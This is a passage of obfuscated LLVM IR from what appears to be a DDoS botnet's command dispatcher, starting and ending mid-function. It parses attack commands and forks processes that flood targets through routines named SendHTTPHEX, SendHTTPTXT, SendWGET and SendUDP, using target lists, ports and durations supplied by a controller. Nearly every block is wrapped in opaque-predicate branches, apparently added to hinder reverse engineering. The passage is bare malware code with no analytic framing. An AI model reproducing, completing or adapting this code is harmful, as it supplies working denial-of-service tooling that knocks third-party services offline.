  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %383
  %392 = load i32, i32* @x.89
  %393 = load i32, i32* @y.90
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %1433

; <label>:400:                                    ; preds = %originalBBpart240
  %401 = call i32 @listFork()
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %403, label %404

; <label>:403:                                    ; preds = %400
  br label %1433

; <label>:404:                                    ; preds = %400
  %405 = load i32, i32* @x.89
  %406 = load i32, i32* @y.90
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %404
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 1
  %415 = load i8*, i8** %414, align 8
  %416 = load i8**, i8*** %4, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 2
  %418 = load i8*, i8** %417, align 8
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 3
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #9
  %423 = trunc i32 %422 to i16
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 4
  %426 = load i8*, i8** %425, align 8
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 5
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #9
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 6
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #9
  call void @SendHTTPHEX(i8* %415, i8* %418, i16 zeroext %423, i8* %426, i32 %430, i32 %434)
  call void @exit(i32 0) #12
  %435 = load i32, i32* @x.89
  %436 = load i32, i32* @y.90
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  unreachable

; <label>:443:                                    ; preds = %346
  %444 = load i32, i32* @x.89
  %445 = load i32, i32* @y.90
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %443
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 0
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @strcmp(i8* %454, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.189, i32 0, i32 0)) #9
  %456 = icmp ne i32 %455, 0
  %457 = load i32, i32* @x.89
  %458 = load i32, i32* @y.90
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %456, label %556, label %465

; <label>:465:                                    ; preds = %originalBBpart252
  %466 = load i32, i32* %3, align 4
  %467 = icmp slt i32 %466, 6
  br i1 %467, label %512, label %468

; <label>:468:                                    ; preds = %465
  %469 = load i32, i32* @x.89
  %470 = load i32, i32* @y.90
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %468
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 3
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @atoi(i8* %479) #9
  %481 = icmp slt i32 %480, 1
  %482 = load i32, i32* @x.89
  %483 = load i32, i32* @y.90
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %481, label %512, label %490

; <label>:490:                                    ; preds = %originalBBpart256
  %491 = load i32, i32* @x.89
  %492 = load i32, i32* @y.90
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %490
  %499 = load i8**, i8*** %4, align 8
  %500 = getelementptr inbounds i8*, i8** %499, i64 5
  %501 = load i8*, i8** %500, align 8
  %502 = call i32 @atoi(i8* %501) #9
  %503 = icmp slt i32 %502, 1
  %504 = load i32, i32* @x.89
  %505 = load i32, i32* @y.90
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %503, label %512, label %529

; <label>:512:                                    ; preds = %originalBBpart260, %originalBBpart256, %465
  %513 = load i32, i32* @x.89
  %514 = load i32, i32* @y.90
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %512
  %521 = load i32, i32* @x.89
  %522 = load i32, i32* @y.90
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %1433

; <label>:529:                                    ; preds = %originalBBpart260
  %530 = call i32 @listFork()
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %532, label %533

; <label>:532:                                    ; preds = %529
  br label %1433

; <label>:533:                                    ; preds = %529
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 1
  %536 = load i8*, i8** %535, align 8
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 2
  %539 = load i8*, i8** %538, align 8
  %540 = load i8**, i8*** %4, align 8
  %541 = getelementptr inbounds i8*, i8** %540, i64 3
  %542 = load i8*, i8** %541, align 8
  %543 = call i32 @atoi(i8* %542) #9
  %544 = trunc i32 %543 to i16
  %545 = load i8**, i8*** %4, align 8
  %546 = getelementptr inbounds i8*, i8** %545, i64 4
  %547 = load i8*, i8** %546, align 8
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 5
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @atoi(i8* %550) #9
  %552 = load i8**, i8*** %4, align 8
  %553 = getelementptr inbounds i8*, i8** %552, i64 6
  %554 = load i8*, i8** %553, align 8
  %555 = call i32 @atoi(i8* %554) #9
  call void @SendHTTPTXT(i8* %536, i8* %539, i16 zeroext %544, i8* %547, i32 %551, i32 %555)
  call void @exit(i32 0) #12
  unreachable

; <label>:556:                                    ; preds = %originalBBpart252
  %557 = load i32, i32* @x.89
  %558 = load i32, i32* @y.90
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %556
  %565 = load i8**, i8*** %4, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 0
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @strcmp(i8* %567, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.190, i32 0, i32 0)) #9
  %569 = icmp ne i32 %568, 0
  %570 = load i32, i32* @x.89
  %571 = load i32, i32* @y.90
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %569, label %704, label %578

; <label>:578:                                    ; preds = %originalBBpart268
  %579 = load i32, i32* %3, align 4
  %580 = icmp slt i32 %579, 3
  br i1 %580, label %587, label %581

; <label>:581:                                    ; preds = %578
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #9
  %586 = icmp slt i32 %585, 1
  br i1 %586, label %587, label %604

; <label>:587:                                    ; preds = %581, %578
  %588 = load i32, i32* @x.89
  %589 = load i32, i32* @y.90
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %587
  %596 = load i32, i32* @x.89
  %597 = load i32, i32* @y.90
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1433

; <label>:604:                                    ; preds = %581
  %605 = load i8**, i8*** %4, align 8
  %606 = getelementptr inbounds i8*, i8** %605, i64 1
  %607 = load i8*, i8** %606, align 8
  store i8* %607, i8** %11, align 8
  %608 = load i8**, i8*** %4, align 8
  %609 = getelementptr inbounds i8*, i8** %608, i64 2
  %610 = load i8*, i8** %609, align 8
  %611 = call i32 @atoi(i8* %610) #9
  store i32 %611, i32* %12, align 4
  %612 = load i8*, i8** %11, align 8
  %613 = call i8* @strstr(i8* %612, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %614 = icmp ne i8* %613, null
  br i1 %614, label %615, label %655

; <label>:615:                                    ; preds = %604
  %616 = load i32, i32* @x.89
  %617 = load i32, i32* @y.90
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %615
  %624 = load i8*, i8** %11, align 8
  %625 = call i8* @strtok(i8* %624, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %625, i8** %13, align 8
  %626 = load i32, i32* @x.89
  %627 = load i32, i32* @y.90
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %634

; <label>:634:                                    ; preds = %652, %originalBBpart276
  %635 = load i8*, i8** %13, align 8
  %636 = icmp ne i8* %635, null
  br i1 %636, label %637, label %654

; <label>:637:                                    ; preds = %634
  %638 = call i32 @listFork()
  %639 = icmp ne i32 %638, 0
  br i1 %639, label %652, label %640

; <label>:640:                                    ; preds = %637
  store i32 0, i32* %14, align 4
  br label %641

; <label>:641:                                    ; preds = %644, %640
  %642 = load i32, i32* %14, align 4
  %643 = icmp slt i32 %642, 10
  br i1 %643, label %644, label %649

; <label>:644:                                    ; preds = %641
  %645 = load i8*, i8** %11, align 8
  %646 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %645, i32 %646)
  %647 = load i32, i32* %14, align 4
  %648 = add nsw i32 %647, 1
  store i32 %648, i32* %14, align 4
  br label %641

; <label>:649:                                    ; preds = %641
  %650 = load i32, i32* @mainCommSock, align 4
  %651 = call i32 @close(i32 %650)
  call void @_exit(i32 0) #11
  unreachable

; <label>:652:                                    ; preds = %637
  %653 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %653, i8** %13, align 8
  br label %634

; <label>:654:                                    ; preds = %634
  br label %703

; <label>:655:                                    ; preds = %604
  %656 = call i32 @listFork()
  %657 = icmp ne i32 %656, 0
  br i1 %657, label %658, label %659

; <label>:658:                                    ; preds = %655
  br label %1433

; <label>:659:                                    ; preds = %655
  %660 = load i32, i32* @x.89
  %661 = load i32, i32* @y.90
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %659
  store i32 0, i32* %15, align 4
  %668 = load i32, i32* @x.89
  %669 = load i32, i32* @y.90
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %676

; <label>:676:                                    ; preds = %originalBBpart292, %originalBBpart280
  %677 = load i32, i32* %15, align 4
  %678 = icmp slt i32 %677, 10
  br i1 %678, label %679, label %700

; <label>:679:                                    ; preds = %676
  %680 = load i32, i32* @x.89
  %681 = load i32, i32* @y.90
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %679
  %688 = load i8*, i8** %11, align 8
  %689 = load i32, i32* %12, align 4
  call void @SendWGET(i8* %688, i32 %689)
  %690 = load i32, i32* %15, align 4
  %691 = add nsw i32 %690, 1
  store i32 %691, i32* %15, align 4
  %692 = load i32, i32* @x.89
  %693 = load i32, i32* @y.90
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBBpart292, label %originalBB82alteredBB

originalBBpart292:                                ; preds = %originalBB82
  br label %676

; <label>:700:                                    ; preds = %676
  %701 = load i32, i32* @mainCommSock, align 4
  %702 = call i32 @close(i32 %701)
  call void @_exit(i32 0) #11
  unreachable

; <label>:703:                                    ; preds = %654
  br label %704

; <label>:704:                                    ; preds = %703, %originalBBpart268
  %705 = load i8**, i8*** %4, align 8
  %706 = getelementptr inbounds i8*, i8** %705, i64 0
  %707 = load i8*, i8** %706, align 8
  %708 = call i32 @strcmp(i8* %707, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0)) #9
  %709 = icmp ne i32 %708, 0
  br i1 %709, label %855, label %710

; <label>:710:                                    ; preds = %704
  %711 = load i32, i32* %3, align 4
  %712 = icmp slt i32 %711, 6
  br i1 %712, label %762, label %713

; <label>:713:                                    ; preds = %710
  %714 = load i32, i32* @x.89
  %715 = load i32, i32* @y.90
  %716 = sub i32 %714, 1
  %717 = mul i32 %714, %716
  %718 = urem i32 %717, 2
  %719 = icmp eq i32 %718, 0
  %720 = icmp slt i32 %715, 10
  %721 = or i1 %719, %720
  br i1 %721, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %713
  %722 = load i8**, i8*** %4, align 8
  %723 = getelementptr inbounds i8*, i8** %722, i64 3
  %724 = load i8*, i8** %723, align 8
  %725 = call i32 @atoi(i8* %724) #9
  %726 = icmp eq i32 %725, -1
  %727 = load i32, i32* @x.89
  %728 = load i32, i32* @y.90
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %726, label %762, label %735

; <label>:735:                                    ; preds = %originalBBpart296
  %736 = load i8**, i8*** %4, align 8
  %737 = getelementptr inbounds i8*, i8** %736, i64 2
  %738 = load i8*, i8** %737, align 8
  %739 = call i32 @atoi(i8* %738) #9
  %740 = icmp eq i32 %739, -1
  br i1 %740, label %762, label %741

; <label>:741:                                    ; preds = %735
  %742 = load i8**, i8*** %4, align 8
  %743 = getelementptr inbounds i8*, i8** %742, i64 4
  %744 = load i8*, i8** %743, align 8
  %745 = call i32 @atoi(i8* %744) #9
  %746 = icmp eq i32 %745, -1
  br i1 %746, label %762, label %747

; <label>:747:                                    ; preds = %741
  %748 = load i8**, i8*** %4, align 8
  %749 = getelementptr inbounds i8*, i8** %748, i64 4
  %750 = load i8*, i8** %749, align 8
  %751 = call i32 @atoi(i8* %750) #9
  %752 = icmp sgt i32 %751, 1024
  br i1 %752, label %762, label %753

; <label>:753:                                    ; preds = %747
  %754 = load i32, i32* %3, align 4
  %755 = icmp eq i32 %754, 6
  br i1 %755, label %756, label %763

; <label>:756:                                    ; preds = %753
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 5
  %759 = load i8*, i8** %758, align 8
  %760 = call i32 @atoi(i8* %759) #9
  %761 = icmp slt i32 %760, 1
  br i1 %761, label %762, label %763

; <label>:762:                                    ; preds = %756, %747, %741, %735, %originalBBpart296, %710
  br label %1433

; <label>:763:                                    ; preds = %756, %753
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 1
  %766 = load i8*, i8** %765, align 8
  store i8* %766, i8** %16, align 8
  %767 = load i8**, i8*** %4, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 2
  %769 = load i8*, i8** %768, align 8
  %770 = call i32 @atoi(i8* %769) #9
  store i32 %770, i32* %17, align 4
  %771 = load i8**, i8*** %4, align 8
  %772 = getelementptr inbounds i8*, i8** %771, i64 3
  %773 = load i8*, i8** %772, align 8
  %774 = call i32 @atoi(i8* %773) #9
  store i32 %774, i32* %18, align 4
  %775 = load i8**, i8*** %4, align 8
  %776 = getelementptr inbounds i8*, i8** %775, i64 4
  %777 = load i8*, i8** %776, align 8
  %778 = call i32 @atoi(i8* %777) #9
  store i32 %778, i32* %19, align 4
  %779 = load i32, i32* %3, align 4
  %780 = icmp eq i32 %779, 6
  br i1 %780, label %781, label %786

; <label>:781:                                    ; preds = %763
  %782 = load i8**, i8*** %4, align 8
  %783 = getelementptr inbounds i8*, i8** %782, i64 5
  %784 = load i8*, i8** %783, align 8
  %785 = call i32 @atoi(i8* %784) #9
  br label %787

; <label>:786:                                    ; preds = %763
  br label %787

; <label>:787:                                    ; preds = %786, %781
  %788 = phi i32 [ %785, %781 ], [ 10, %786 ]
  store i32 %788, i32* %20, align 4
  store i32 32, i32* %21, align 4
  %789 = load i8*, i8** %16, align 8
  %790 = call i8* @strstr(i8* %789, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %791 = icmp ne i8* %790, null
  br i1 %791, label %792, label %827

; <label>:792:                                    ; preds = %787
  %793 = load i8*, i8** %16, align 8
  %794 = call i8* @strtok(i8* %793, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %794, i8** %22, align 8
  br label %795

; <label>:795:                                    ; preds = %824, %792
  %796 = load i8*, i8** %22, align 8
  %797 = icmp ne i8* %796, null
  br i1 %797, label %798, label %826

; <label>:798:                                    ; preds = %795
  %799 = call i32 @listFork()
  %800 = icmp ne i32 %799, 0
  br i1 %800, label %824, label %801

; <label>:801:                                    ; preds = %798
  %802 = load i32, i32* @x.89
  %803 = load i32, i32* @y.90
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %801
  %810 = load i8*, i8** %22, align 8
  %811 = load i32, i32* %17, align 4
  %812 = load i32, i32* %18, align 4
  %813 = load i32, i32* %19, align 4
  %814 = load i32, i32* %20, align 4
  %815 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %810, i32 %811, i32 %812, i32 %813, i32 %814, i32 %815)
  call void @_exit(i32 0) #11
  %816 = load i32, i32* @x.89
  %817 = load i32, i32* @y.90
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  unreachable

; <label>:824:                                    ; preds = %798
  %825 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %825, i8** %22, align 8
  br label %795

; <label>:826:                                    ; preds = %795
  br label %854

; <label>:827:                                    ; preds = %787
  %828 = call i32 @listFork()
  %829 = icmp ne i32 %828, 0
  br i1 %829, label %830, label %847

; <label>:830:                                    ; preds = %827
  %831 = load i32, i32* @x.89
  %832 = load i32, i32* @y.90
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %830
  %839 = load i32, i32* @x.89
  %840 = load i32, i32* @y.90
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %1433

; <label>:847:                                    ; preds = %827
  %848 = load i8*, i8** %16, align 8
  %849 = load i32, i32* %17, align 4
  %850 = load i32, i32* %18, align 4
  %851 = load i32, i32* %19, align 4
  %852 = load i32, i32* %20, align 4
  %853 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %848, i32 %849, i32 %850, i32 %851, i32 %852, i32 %853)
  call void @_exit(i32 0) #11
  unreachable

; <label>:854:                                    ; preds = %826
  br label %855

; <label>:855:                                    ; preds = %854, %704
  %856 = load i8**, i8*** %4, align 8
  %857 = getelementptr inbounds i8*, i8** %856, i64 0
  %858 = load i8*, i8** %857, align 8
  %859 = call i32 @strcmp(i8* %858, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.192, i32 0, i32 0)) #9
  %860 = icmp ne i32 %859, 0
  br i1 %860, label %1126, label %861

; <label>:861:                                    ; preds = %855
  %862 = load i32, i32* @x.89
  %863 = load i32, i32* @y.90
  %864 = sub i32 %862, 1
  %865 = mul i32 %862, %864
  %866 = urem i32 %865, 2
  %867 = icmp eq i32 %866, 0
  %868 = icmp slt i32 %863, 10
  %869 = or i1 %867, %868
  br i1 %869, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %861
  %870 = load i32, i32* %3, align 4
  %871 = icmp slt i32 %870, 6
  %872 = load i32, i32* @x.89
  %873 = load i32, i32* @y.90
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %871, label %926, label %880

; <label>:880:                                    ; preds = %originalBBpart2108
  %881 = load i8**, i8*** %4, align 8
  %882 = getelementptr inbounds i8*, i8** %881, i64 3
  %883 = load i8*, i8** %882, align 8
  %884 = call i32 @atoi(i8* %883) #9
  %885 = icmp eq i32 %884, -1
  br i1 %885, label %926, label %886

; <label>:886:                                    ; preds = %880
  %887 = load i32, i32* @x.89
  %888 = load i32, i32* @y.90
  %889 = sub i32 %887, 1
  %890 = mul i32 %887, %889
  %891 = urem i32 %890, 2
  %892 = icmp eq i32 %891, 0
  %893 = icmp slt i32 %888, 10
  %894 = or i1 %892, %893
  br i1 %894, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %886
  %895 = load i8**, i8*** %4, align 8
  %896 = getelementptr inbounds i8*, i8** %895, i64 2
  %897 = load i8*, i8** %896, align 8
  %898 = call i32 @atoi(i8* %897) #9
  %899 = icmp eq i32 %898, -1
  %900 = load i32, i32* @x.89
  %901 = load i32, i32* @y.90
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %899, label %926, label %908

; <label>:908:                                    ; preds = %originalBBpart2112
  %909 = load i32, i32* %3, align 4
  %910 = icmp sgt i32 %909, 5
  br i1 %910, label %911, label %917

; <label>:911:                                    ; preds = %908
  %912 = load i8**, i8*** %4, align 8
  %913 = getelementptr inbounds i8*, i8** %912, i64 5
  %914 = load i8*, i8** %913, align 8
  %915 = call i32 @atoi(i8* %914) #9
  %916 = icmp slt i32 %915, 0
  br i1 %916, label %926, label %917

; <label>:917:                                    ; preds = %911, %908
  %918 = load i32, i32* %3, align 4
  %919 = icmp eq i32 %918, 7
  br i1 %919, label %920, label %943

; <label>:920:                                    ; preds = %917
  %921 = load i8**, i8*** %4, align 8
  %922 = getelementptr inbounds i8*, i8** %921, i64 6
  %923 = load i8*, i8** %922, align 8
  %924 = call i32 @atoi(i8* %923) #9
  %925 = icmp slt i32 %924, 1
  br i1 %925, label %926, label %943

; <label>:926:                                    ; preds = %920, %911, %originalBBpart2112, %880, %originalBBpart2108
  %927 = load i32, i32* @x.89
  %928 = load i32, i32* @y.90
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %926
  %935 = load i32, i32* @x.89
  %936 = load i32, i32* @y.90
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1433

; <label>:943:                                    ; preds = %920, %917
  %944 = load i32, i32* @x.89
  %945 = load i32, i32* @y.90
  %946 = sub i32 %944, 1
  %947 = mul i32 %944, %946
  %948 = urem i32 %947, 2
  %949 = icmp eq i32 %948, 0
  %950 = icmp slt i32 %945, 10
  %951 = or i1 %949, %950
  br i1 %951, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %943
  %952 = load i8**, i8*** %4, align 8
  %953 = getelementptr inbounds i8*, i8** %952, i64 1
  %954 = load i8*, i8** %953, align 8
  store i8* %954, i8** %23, align 8
  %955 = load i8**, i8*** %4, align 8
  %956 = getelementptr inbounds i8*, i8** %955, i64 2
  %957 = load i8*, i8** %956, align 8
  %958 = call i32 @atoi(i8* %957) #9
  store i32 %958, i32* %24, align 4
  %959 = load i8**, i8*** %4, align 8
  %960 = getelementptr inbounds i8*, i8** %959, i64 3
  %961 = load i8*, i8** %960, align 8
  %962 = call i32 @atoi(i8* %961) #9
  store i32 %962, i32* %25, align 4
  %963 = load i8**, i8*** %4, align 8
